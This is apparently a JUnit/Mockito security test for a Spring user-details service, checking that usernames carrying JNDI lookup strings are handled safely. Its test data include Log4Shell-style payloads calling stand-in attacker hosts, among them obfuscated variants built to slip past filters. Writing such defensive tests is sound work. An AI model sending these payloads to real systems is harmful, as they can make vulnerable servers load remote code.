package com.contrast.frontgateservice.service;

import com.contrast.frontgateservice.entity.User;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.when;

@ExtendWith(MockitoExtension.class)
class CustomUserDetailsServiceSecurityTest {

    @Mock
    private UserService userService;

    @InjectMocks
    private CustomUserDetailsService customUserDetailsService;

    private User testUser;

    @BeforeEach
    void setUp() {
        testUser = new User();
        testUser.setId(1L);
        testUser.setUsername("testuser");
        testUser.setPassword("encodedPassword");
        testUser.setEnabled(true);
    }

    @Test
    void testLoadUserByUsername_WithJNDIInjectionAttempt_ShouldNotThrowException() {
        String maliciousUsername = "${jndi:ldap://exploit-server:1389/serial/CommonsCollections2}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);
        
        UserDetails userDetails = customUserDetailsService.loadUserByUsername(maliciousUsername);
        
        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
    }

    @Test
    void testLoadUserByUsername_WithVariousJNDIPatterns_ShouldHandleSafely() {
        String[] maliciousPatterns = {
            "${jndi:ldap://attacker.com/exploit}",
            "${jndi:rmi://attacker.com/exploit}",
            "${jndi:dns://attacker.com/exploit}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
            "${${lower:j}ndi:ldap://attacker.com/a}",
            "${${upper:j}ndi:ldap://attacker.com/a}"
        };
        
        for (String pattern : maliciousPatterns) {
            when(userService.findByUsername(pattern)).thenReturn(testUser);
            
            assertDoesNotThrow(() -> {
                UserDetails userDetails = customUserDetailsService.loadUserByUsername(pattern);
                assertNotNull(userDetails);
            }, "Should handle JNDI pattern safely: " + pattern);
        }
    }

    @Test
    void testLoadUserByUsername_WithNormalUsername_ShouldWorkCorrectly() {
        String normalUsername = "normaluser";
        
        when(userService.findByUsername(normalUsername)).thenReturn(testUser);
        
        UserDetails userDetails = customUserDetailsService.loadUserByUsername(normalUsername);
        
        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        assertTrue(userDetails.isEnabled());
    }

    @Test
    void testLoadUserByUsername_WithNonExistentUser_ShouldThrowException() {
        String username = "nonexistent";
        
        when(userService.findByUsername(username)).thenReturn(null);
        
        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(username);
        });
    }

    @Test
    void testLoadUserByUsername_WithSpecialCharacters_ShouldHandleSafely() {
        String[] specialUsernames = {
            "user{test}",
            "user$test",
            "user{$test}",
            "${test}user"
        };
        
        for (String username : specialUsernames) {
            when(userService.findByUsername(username)).thenReturn(testUser);
            
            assertDoesNotThrow(() -> {
                UserDetails userDetails = customUserDetailsService.loadUserByUsername(username);
                assertNotNull(userDetails);
            }, "Should handle special characters safely: " + username);
        }
    }
}
